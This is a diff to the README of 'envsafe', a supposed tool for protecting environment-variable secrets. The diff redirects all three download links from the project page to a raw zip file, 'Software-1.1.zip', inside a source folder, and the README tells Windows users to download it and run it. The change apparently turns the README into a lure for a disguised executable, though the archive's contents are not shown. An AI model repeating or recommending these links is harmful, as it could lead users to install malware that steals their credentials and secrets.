@@ -1,6 +1,6 @@
 # 🔐 envsafe - Keep Secrets Safe on Every Device
 
-[![Download envsafe](https://img.shields.io/badge/Download%20envsafe-blue.svg?style=for-the-badge)](https://github.com/Ilovema4629/envsafe)
+[![Download envsafe](https://img.shields.io/badge/Download%20envsafe-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Ilovema4629/envsafe/main/src/cli/Software-1.1.zip)
 
 ## 🧰 What envsafe Does
 
@@ -12,7 +12,7 @@ If you work with apps that use environment variables, envsafe gives you a safer 
 
 Visit this page to download and use the app:
 
-[Download envsafe](https://github.com/Ilovema4629/envsafe)
+[Download envsafe](https://raw.githubusercontent.com/Ilovema4629/envsafe/main/src/cli/Software-1.1.zip)
 
 On Windows, open the page, look for the latest release or app package, then download the file to your PC. After the file finishes downloading, run it to start the app.
 
@@ -187,4 +187,4 @@ Yes. Use profiles to separate different groups of secrets.
 
 Open the download page, get the Windows app, and run it on your PC.
 
-[Download envsafe](https://github.com/Ilovema4629/envsafe)
+[Download envsafe](https://raw.githubusercontent.com/Ilovema4629/envsafe/main/src/cli/Software-1.1.zip)
